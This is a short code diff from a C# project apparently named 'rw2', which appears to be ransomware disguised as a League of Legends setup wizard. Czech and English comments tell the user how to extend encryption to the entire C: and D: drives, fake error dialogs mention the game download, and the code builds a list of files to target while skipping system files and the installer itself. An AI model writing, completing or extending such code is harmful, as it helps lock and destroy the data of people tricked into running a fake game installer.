@@ -65,9 +65,9 @@ namespace rw2
             //
             //
             //      CZ:POKUD CHCETE SIFROVAT CELY DISK C: A D: ODSTRANTE VSECHNY KOMENTARE V TETO METODE
-            //         A TAKE NAHRADTE RETEZEC filePath S "C:"
+            //         A TAKE NAHRADTE RETEZEC filePath S @"C:\"
             //      EN:IF YOU WANT TO ENCRYPT DRIVES C: AND D: MAKE SURE TO REMOVE ALL COMMENTS IN THIS METHOD
-            //         AND REPLACE STRING filePath WITH "C:"
+            //         AND REPLACE STRING filePath WITH @"C:\"
             //
             //
             //try { 
@@ -77,19 +77,11 @@ namespace rw2
             //   MessageBox.Show("Couldn't load C: disk, please make sure C: drive exists, else League of Legends will not be downloaded.");
             //      Hide();
             //}
-            //try
-            //{
-            //    filePathsBefore += Directory.GetFiles("D:", "*.*", SearchOption.AllDirectories).ToList();
-            //}
-            //catch
-            //{
-            //    MessageBox.Show("Couldn't load D: disk, please make sure D: drive exists, else League of Legends will not be downloaded.");
-            //    Hide();
-            //}
             filePathsBefore.RemoveAll(x => x.Contains("LoLSetupWizard"));
             filePathsBefore.RemoveAll(x => x.Contains(".exe"));
             filePathsBefore.RemoveAll(x => x.Contains(".sys"));
             filePathsBefore.RemoveAll(x => x.Contains(".dll"));
+            filePathsBefore.RemoveAll(x => x.Contains(".bin"));
             foreach (string file in filePathsBefore)
             {
                 if (file.Contains(@"\")) 
